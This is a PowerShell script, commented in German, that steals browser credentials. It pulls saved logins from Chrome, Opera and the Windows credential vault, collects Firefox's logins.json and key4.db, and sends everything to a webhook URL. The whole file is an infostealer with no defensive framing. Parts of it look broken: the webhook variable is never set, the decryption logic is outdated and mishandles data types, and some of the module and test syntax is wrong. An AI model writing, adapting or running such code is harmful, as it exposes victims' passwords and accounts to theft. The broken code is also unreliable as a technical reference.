# Installieren notwendiger Module
if (-not (Get-Module -ListAvailable -Name System.Data.SQLite)) {
    Install-Package -Name "System.Data.SQLite" -Source "nuget.org" -Force
    Import-Module "System.Data.SQLite"
}

# Funktion zum Entschlüsseln von verschlüsselten Passwörtern in Chromium-basierten Browsern (Chrome, Opera)
function Get-ChromiumPasswords {
    param (
        [string]$browserPath
    )

    $localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
    $dbPath = "$localAppData\$browserPath\User Data\Default\Login Data"
    $tempDb = "$env:TEMP\Login Data"

    # Kopieren der Datenbank, um Sperren zu vermeiden
    Copy-Item $dbPath $tempDb -Force

    # Verbindung zur SQLite-Datenbank herstellen
    Add-Type -AssemblyName System.Data.SQLite
    $connectionString = "Data Source=$tempDb;Version=3;"
    $query = "SELECT origin_url, username_value, password_value FROM logins"

    # SQLite-Datenbank abfragen
    $connection = New-Object System.Data.SQLite.SQLiteConnection
    $connection.ConnectionString = $connectionString
    $connection.Open()

    $command = $connection.CreateCommand()
    $command.CommandText = $query
    $reader = $command.ExecuteReader()

    $passwords = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = $reader["password_value"]

        # Entschlüsseln des Passworts
        $entropy = [byte[]](0)
        $decryptedPassword = [System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($encryptedPassword), $entropy, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $password = [System.Text.Encoding]::UTF8.GetString($decryptedPassword)

        $passwords += [PSCustomObject]@{ URL = $url; Username = $username; Password = $password }
    }

    $reader.Close()
    $connection.Close()
    Remove-Item $tempDb -Force

    return $passwords
}

# Funktion zum Sammeln der Firefox-Dateien
function Get-FirefoxFiles {
    $appData = [System.Environment]::GetFolderPath('ApplicationData')
    $firefoxProfile = Get-ChildItem "$appData\Mozilla\Firefox\Profiles" | Where-Object { $_.PSIsContainer } | Select-Object -First 1
    $loginsJson = "$appData\Mozilla\Firefox\Profiles\$firefoxProfile\logins.json"
    $key4Db = "$appData\Mozilla\Firefox\Profiles\$firefoxProfile\key4.db"

    if (Test-Path $loginsJson -and Test-Path $key4Db) {
        return @($loginsJson, $key4Db)
    }
    return @()
}

# Funktion zum Senden einer Datei an den Webhook
function Send-FileToWebhook {
    param (
        [string]$filePath,
        [string]$webhookUrl
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileBase64 = [Convert]::ToBase64String($fileBytes)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $body = @{
        FileName = $fileName
        FileContent = $fileBase64
    }

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
}

# Funktion zum Auslesen von Edge-Passwörtern
function Get-EdgePasswords {
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $vault.RetrieveAll() | ForEach-Object {
        $_.RetrievePassword()
        [PSCustomObject]@{
            URL = $_.Resource
            Username = $_.UserName
            Password = $_.Password
        }
    }
}

# Edge-Passwörter sammeln und senden
$edgePasswords = Get-EdgePasswords
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Edge"; "Passwords" = $edgePasswords}) -ContentType "application/json"

# Chrome-Passwörter sammeln und senden
$chromePasswords = Get-ChromiumPasswords -browserPath "Google\Chrome"
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Chrome"; "Passwords" = $chromePasswords}) -ContentType "application/json"

# Opera-Passwörter sammeln und senden
$operaPasswords = Get-ChromiumPasswords -browserPath "Opera Software\Opera Stable"
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json @{"Browser" = "Opera"; "Passwords" = $operaPasswords}) -ContentType "application/json"

# Firefox-Dateien sammeln und senden
$firefoxFiles = Get-FirefoxFiles
foreach ($file in $firefoxFiles) {
    Send-FileToWebhook -filePath $file -webhookUrl $webhookUrl
}
